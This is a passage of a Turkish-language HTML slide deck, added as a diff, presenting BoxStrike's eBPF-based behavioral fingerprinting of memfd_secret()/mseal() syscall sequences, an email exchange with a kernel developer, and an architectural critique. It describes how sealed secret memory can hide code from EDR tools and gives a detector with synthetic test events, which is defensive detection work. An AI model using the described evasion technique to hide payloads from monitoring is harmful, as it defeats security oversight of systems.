+                Hashlenen tek şey: syscall isimleri, argümanlar (flags/len/prot)
+                ve adımlar arası kaba zamanlama bucket’larıdır.
+            </p>
+            <p>
+                <strong>Sonuç:</strong> Aynı davranış dizisini izleyen farklı byte
+                içeriklerine sahip iki süreç <strong>aynı fingerprint’i</strong> üretir.
+                Bu, polymorphic/metamorphic shellcode’a karşı content-hash’ten
+                daha dayanıklı olmasını sağlar.
+            </p>
+        </div>
+
+        <h3>6.1. Mimari</h3>
+        <div style="background: #f4f6f8; padding: 16px 20px; border-radius: 8px; margin: 12px 0; font-family: 'Consolas', monospace; font-size: 15px; white-space: pre-wrap;">
+kernel (bpftrace)                 userspace (python)
+------------------                -------------------
+sys_enter_memfd_secret   \
+sys_exit_memfd_secret     \
+sys_enter/exit_mmap        >---> ham EVENT satırları ---> state machine
+sys_enter_mprotect         /                            + risk_score
+sys_enter_mseal           /                             + SHA-256 fingerprint
+        </div>
+        <ul>
+            <li><strong>Kernel tarafı (<code>secretmem_watch.bt</code>):</strong> Sadece event üretir. Hiçbir hesaplama/korelasyon/hash yapmaz.</li>
+            <li><strong>Userspace tarafı (<code>signature_correlator.py</code>):</strong> PID bazlı state machine kurar, dizi + argümanlar + zamanlama bucket’larından SHA-256 fingerprint üretir, risk skoru eşiği geçilince JSON alert basar.</li>
+        </ul>
+
+        <h3>6.2. Çalıştırma</h3>
+        <pre>
+sudo bpftrace secretmem_watch.bt | python3 signature_correlator.py
+        </pre>
+        <p>
+            Gereksinimler: root veya <code>CAP_BPF + CAP_PERFMON</code>, BTF destekli kernel,
+            <code>memfd_secret()</code>/<code>mseal()</code> syscall’larının bulunduğu kernel sürümü.
+        </p>
+
+        <h3>6.3. Test</h3>
+        <pre>
+python3 signature_correlator.py &lt;&lt;'EOF'
+EVENT|MEMFD_SECRET|1234|proc|1000000000|flags=0 fd=5
+EVENT|MMAP_SECRETMEM|1234|proc|1000500000|addr=0x7f0000000000 len=4096 prot=3
+EVENT|MPROTECT|1234|proc|1000600000|addr=0x7f0000000000 len=4096 prot=5 exec=1
+EVENT|MSEAL|1234|proc|1000700000|addr=0x7f0000000000 len=4096 flags=1
+EOF
+        </pre>
+
+        <h3>6.4. Bilinen Sınırlamalar</h3>
+        <ul>
+            <li><strong>Adres eşleştirmesi:</strong> mprotect/mseal korelasyonu tam adres eşleşmesine dayanır. Saldırgan farklı bir adresle çağırırsa kaçırır. Sağlam versiyon için interval tree / BPF_MAP_TYPE_LPM_TRIE gerekir.</li>
+            <li><strong>RIP tabanlı attribution:</strong> Hangi syscall’in secretmem bölgesinden tetiklendiğini tespit etme özelliği (pt_regs->ip) bu PoC’de yoktur; <code>kprobe:do_syscall_64 + PT_REGS_IP()</code> ile eklenebilir.</li>
+            <li><strong>Heuristic / triage sinyali:</strong> Kesin imza değildir. Zararsız bir JIT derleyici de benzer risk skoru üretebilir; eşikler ortama göre ayarlanmalıdır.</li>
+            <li><strong>Adım atlama:</strong> Saldırgan mprotect/mseal adımlarını atlarsa dizi kısalır ve risk skoru düşer. Bu PoC “her zaman yakalar” iddiasında değildir; belirli bir davranış sınıfını ön plana çıkarmayı amaçlar.</li>
+        </ul>
+
+        <div style="margin-top: 24px; padding: 16px 20px; background: #e8ecf0; border-radius: 8px; text-align: center;">
+            <a href="https://github.com/BoxStrikesTeam/GhostPrint-SMBF-SecretMem-Behavioral-Fingerprinting" target="_blank" class="github-link">
+                📂 GitHub Reposu: GhostPrint-SMBF-SecretMem-Behavioral-Fingerprinting
+            </a>
+            <p style="font-size: 15px; color: #3a4a5a; margin-top: 8px;">
+                PoC kodları, bpftrace script’i ve Python correlator burada paylaşılmaktadır.
+            </p>
+        </div>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">7 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 8 – LİNUX KERNEL İLE İLETİŞİM (E-POSTA TARTIŞMASI) -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>7. Linux Kernel ile İletişim</h1>
+        <h2>Bulguların Linux Topluluğuna Bildirilmesi</h2>
+        <p>
+            BoxStrike ekibi, bulgularını <strong>5 Temmuz 2025</strong> tarihinde
+            Linux çekirdek geliştiricilerine bildirmiş ve konuyu derinlemesine
+            tartışmıştır. Aşağıda, bu tartışmanın özeti yer almaktadır.
+        </p>
+
+        <div class="email-thread">
+
+            <!-- E-posta 1: BoxStrike → Linux Kernel -->
+            <div class="email-item">
+                <div class="email-header">
+                    <span class="email-from"><strong>BoxStrike Team</strong> &lt;BoxStrikesTeam@proton.me&gt;</span>
+                    <span class="email-date">5 Temmuz 2025</span>
+                </div>
+                <div class="email-body">
+                    <p><strong>Konu:</strong> [RFC] memfd_secret() + mseal(): blind spot for eBPF-based EDR monitoring</p>
+                    <p>
+                        While experimenting with <code>mseal()</code> and <code>memfd_secret()</code> together on a recent kernel,
+                        I ran into what looks like a gap worth discussing: content placed in <code>memfd_secret()</code>-backed
+                        memory is invisible not just to other processes, but also to in-kernel tracing/observability mechanisms.
+                    </p>
+                    <ul>
+                        <li><strong>Bulgu:</strong> Yerel, yetkisiz bir süreç, <code>memfd_secret()</code> ile çekirdekten gizlenmiş ve <code>mseal()</code> ile mühürlenmiş bir bellek bölgesi oluşturabilir.</li>
+                        <li><strong>Sonuç:</strong> Bu bölge, eBPF tabanlı EDR araçları tarafından okunamaz ve <code>mprotect</code>/<code>munmap</code> ile değiştirilemez.</li>
+                        <li><strong>Öneri (a):</strong> <code>memfd_secret()</code> çağrıları için LSM hook / audit event eklenmesi.</li>
+                        <li><strong>Öneri (b):</strong> <code>CAP_BPF/CAP_SYS_ADMIN</code> yetkisine sahip araçların okumasına izin verecek opt-in flag eklenmesi.</li>
+                    </ul>
+                    <div class="signature">
+                        BoxStrike Team<br>
+                        Researcher: Eneshan Erdoğan Karaca
+                    </div>
+                </div>
+            </div>
+
+            <!-- E-posta 2: Paul Moore → BoxStrike -->
+            <div class="email-item">
+                <div class="email-header">
+                    <span class="email-from"><strong>Paul Moore</strong> &lt;paul@paul-moore.com&gt;</span>
+                    <span class="email-date">5 Temmuz 2025</span>
+                </div>
+                <div class="email-body">
+                    <p><strong>Konu:</strong> Re: [RFC] memfd_secret() + mseal(): blind spot for eBPF-based EDR monitoring</p>
+                    <p>
+                        Modern kernels do allow LSM labeling of secretmem inodes, see <code>secretmem_file_create()</code>.
+                    </p>
+                    <div class="signature">paul-moore.com</div>
+                </div>
+            </div>
+
+            <!-- E-posta 3: BoxStrike → Paul Moore (takip) -->
+            <div class="email-item">
+                <div class="email-header">
+                    <span class="email-from"><strong>BoxStrike Team</strong> &lt;BoxStrikesTeam@proton.me&gt;</span>
+                    <span class="email-date">6 Temmuz 2025</span>
+                </div>
+                <div class="email-body">
+                    <p><strong>Konu:</strong> Re: [RFC] memfd_secret() + mseal(): blind spot for eBPF-based EDR monitoring</p>
+                    <p>
+                        Thanks — I found the Gottsche/inode_init_security_anon() thread and can see it landed. That answers (a) cleanly.
+                    </p>
+                    <p>
+                        <strong>On (b), let me push on it a bit further:</strong>
+                    </p>
+                    <ul>
+                        <li>An unprivileged process can populate a <code>memfd_secret()</code> region and <code>mseal()</code> it, producing memory that is <strong>unreadable by any kernel-side introspection path</strong> — including root-owned eBPF tracing programs.</li>
+                        <li>This creates a blind spot for host-based EDR detection.</li>
+                        <li>The ROP threat model assumes an attacker with arbitrary kernel code execution — they can likely walk page tables anyway.</li>
+                        <li>The (b) scenario is a different actor: a <strong>legitimate, privileged monitoring agent</strong> operating through the normal verifier-checked helper path.</li>
+                        <li>If the distinction doesn't hold up, the confidentiality guarantee is fundamentally incompatible with any form of authorized introspection — <strong>this should be documented plainly</strong>.</li>
+                    </ul>
+                    <div class="signature">
+                        Eneshan Erdoğan Karaca
+                    </div>
+                </div>
+            </div>
+
+            <!-- E-posta 4: Paul Moore → BoxStrike -->
+            <div class="email-item">
+                <div class="email-header">
+                    <span class="email-from"><strong>Paul Moore</strong> &lt;paul@paul-moore.com&gt;</span>
+                    <span class="email-date">7 Temmuz 2025</span>
+                </div>
+                <div class="email-body">
+                    <p><strong>Konu:</strong> Re: [RFC] memfd_secret() + mseal(): blind spot for eBPF-based EDR monitoring</p>
+                    <p>
+                        To be very honest, I'm not too concerned about out-of-tree, security products; I'm focused on the in-tree kernel code.
+                        If you are concerned about userspace making use of <code>memfd_secret()</code>, you could block the operation on a
+                        per-process/domain basis using either seccomp or SELinux (other LSMs may have similar functionality).
+                    </p>
+                    <p>
+                        Also, it is important to note that if you find the kernel documentation lacking in a particular area,
+                        I would encourage you to submit a patch to address the shortcomings.
+                    </p>
+                    <div class="signature">paul-moore.com</div>
+                </div>
+            </div>
+
+            <!-- E-posta 5: BoxStrike → Paul Moore (kapanış) -->
+            <div class="email-item">
+                <div class="email-header">
+                    <span class="email-from"><strong>BoxStrike Team</strong> &lt;BoxStrikesTeam@proton.me&gt;</span>
+                    <span class="email-date">8 Temmuz 2025</span>
+                </div>
+                <div class="email-body">
+                    <p><strong>Konu:</strong> Re: [RFC] memfd_secret() + mseal(): blind spot for eBPF-based EDR monitoring</p>
+                    <p>
+                        Thanks for the discussion and for the pointer to <code>secretmem_file_create()</code> — that resolves (a) for me.
+                    </p>
+                    <p>
+                        <strong>On (b), I've thought about it further and agree a kernel patch isn't the right answer here.</strong>
+                        A few closing observations:
+                    </p>
+                    <ol>
+                        <li><strong>Dynamic detection isn't actually closed off</strong> by <code>memfd_secret()</code>+<code>mseal()</code>.
+                            Every syscall a payload makes traps through the normal syscall entry path, and <code>pt_regs->ip</code>
+                            reflects the calling address. Cross-referencing against <code>/proc/pid/maps</code> lets a tracer
+                            attribute syscalls to a secretmem region <strong>without ever reading the region's contents</strong>.</li>
+                        <li>This is a bypassable heuristic (an attacker can proxy syscalls through a separate code path), so dynamic detection alone isn't a complete answer.</li>
+                        <li><strong>The more durable idea:</strong> Hook the <code>memfd_secret()</code>/<code>mmap()</code>/<code>mseal()</code>
+                            call sites and build a signature purely from <strong>call metadata</strong> — arguments, region size, protection flags,
+                            sequence/timing — rather than region contents. This is achievable entirely in userspace/eBPF today with existing hooks.</li>
+                    </ol>
+                    <p>
+                        <strong>Given that, I don't think there's a kernel patch to propose here.</strong> This looks like it's squarely a
+                        detection-engineering problem for security products to solve on top of existing tracepoints, not a kernel gap.
+                    </p>
+                    <div class="signature">
+                        Best,<br>
+                        Eneshan Erdoğan Karaca
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="note-box">
+            <p><strong>Sonuç:</strong> Linux kernel geliştiricileri ile yapılan tartışma sonucunda:</p>
+            <ul>
+                <li>Öneri (a) — LSM labeling — zaten mevcut olarak kabul edildi.</li>
+                <li>Öneri (b) — opt-in flag ile kontrollü okuma — kernel patch gerektirdiği ve mevcut threat model ile çeliştiği için kabul edilmedi.</li>
+                <li><strong>V arılan mutabakat:</strong> Bu bir kernel sorunu değil, mevcut tracepoint'ler üzerine inşa edilebilecek bir <strong>detection-engineering</strong> problemidir.</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">8 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 9 – MİMARİ ELEŞTİRİ VE SONUÇ                        -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>8. Mimari Eleştiri ve Sonuç</h1>
+        <h2>Bu Tasarım Neden Sorunlu?</h2>
+
+        <p>
+            BoxStrike ekibi olarak, bu bulguyu sadece bir "saldırı tekniği" olarak
+            görmüyoruz. Bu, Linux çekirdek mimarisindeki daha büyük bir tasarım
+            sorununun belirtisidir.
+        </p>
+
+        <div class="note-box" style="border-left-color: #d9534f;">
+            <p><strong>Mimari Eleştiri:</strong></p>
+            <p>
+                Bir işletim sisteminde <strong>en yetkili katman çekirdektir (kernel)</strong>.
+                Çekirdek, tüm belleği görebilmeli, denetleyebilmeli ve yönetebilmelidir.
+                <code>memfd_secret()</code>, bu prensibi ihlal ederek çekirdeğin belirli
+                bellek bölgelerini <strong>görmesini engeller</strong>.
+            </p>
+        </div>
+
+        <p><strong>Bu ne anlama gelir?</strong></p>
+        <ul>
+            <li><strong>Saldırgan zaten root ise:</strong> Bu koruma onu durdurmaz (root, <code>/dev/mem</code>, kendi modülü veya <code>ptrace</code> ile erişebilir).</li>
+            <li><strong>Saldırgan root değilse:</strong> Bu koruma zaten ona engel değildir (zaten erişemez).</li>
+            <li><strong>Asıl mağdur:</strong> Meşru güvenlik araçları (EDR, AV, adli bilişim) bu bölgeleri göremez, okuyamaz ve analiz edemez.</li>
+        </ul>
+
+        <div class="note-box" style="border-left-color: #f5a623;">
+            <p><strong>Sonuç:</strong></p>
+            <p>
+                Bu özellik, saldırganın işini kolaylaştırmaktan başka bir işe yaramaz.
+                Çünkü saldırgan zaten sistemde bir şekilde bulunuyorsa, bu gizli bölge
+                ona <strong>tespit edilemeyen</strong> bir alan sunar. Bu, "gizlilik" adına
+                "denetim"den (auditability) feragat edilmesidir ve <strong>güvenlik açısından
+                kabul edilemez</strong> bir zafiyettir.
+            </p>
+        </div>
+
+        <p><strong>Önerimiz:</strong></p>
+        <ul>
+            <li>Bu tür bellek bölgelerine, yalnızca <code>CAP_SYS_ADMIN</code> veya <code>CAP_BPF</code> yetkisine sahip süreçlerin (root, güvenilir eBPF programları, kernel modülleri) erişebilmesi sağlanmalıdır.</li>
+            <li>Yetkisiz kullanıcıların erişimi engellenmelidir.</li>
+            <li>Bu yaklaşım, hem gizliliği korur hem de güvenlik araçlarının sistem üzerinde etkin denetim yapmasına olanak tanır.</li>
+        </ul>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">9 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 10 – KAYNAKÇA VE EKLER                               -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>9. Kaynakça ve Ekler</h1>
+        <h2>Kullanılan Kaynaklar ve Referanslar</h2>
+        <ul>
+            <li>Linux çekirdek kaynak kodu: <code>mm/secretmem.c</code>, <code>mm/mseal.c</code></li>
+            <li>LWN.net – “mseal: sealing memory mappings” (2024)</li>
+            <li>Trail of Bits – “mseal analysis” (2024)</li>
+            <li>Linux hardening mailing list – tartışmalar (2025)</li>
+            <li>MITRE ATT&CK – Defense Evasion (TA0005) / Stealth (TA0005)</li>
+        </ul>
+
+        <h3>Ek – Sistem Çağrısı Detayları</h3>
+        <table>
+            <tr><th>Sistem Çağrısı</th><th>Linux Sürümü</th><th>Yetki</th><th>Kernel İşleyişi Özeti</th></tr>
+            <tr>
+                <td><code>mseal()</code></td>
+                <td>6.10+</td>
+                <td>Root gerektirmez</td>
+                <td><code>vm_flags</code>'a <code>VM_SEALED</code> ekler; <code>can_modify_vma()</code> ile tüm değişiklikleri engeller.</td>
+            </tr>
+            <tr>
+                <td><code>memfd_secret()</code></td>
+                <td>5.14+</td>
+                <td>Root gerektirmez</td>
+                <td><code>set_direct_map_invalid()</code> ile sayfaları direct map'ten kaldırır; <code>copy_from_user()</code>, GUP, eBPF erişimlerini <code>EFAULT</code> ile engeller.</td>
+            </tr>
+        </table>
+
+        <div style="margin-top: 24px; padding: 16px 20px; background: #e8ecf0; border-radius: 8px; text-align: center;">
+            <a href="https://github.com/BoxStrikesTeam" target="_blank" class="github-link">
+                📂 GitHub Organizasyonu: BoxStrikesTeam
+            </a>
+            <p style="font-size: 15px; color: #3a4a5a; margin-top: 8px;">
+                Tüm PoC kodları, araçlar ve raporlar burada paylaşılmaktadır.
+            </p>
+        </div>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">10 / 10</div>
+    </div>
+
+</body>
+</html>
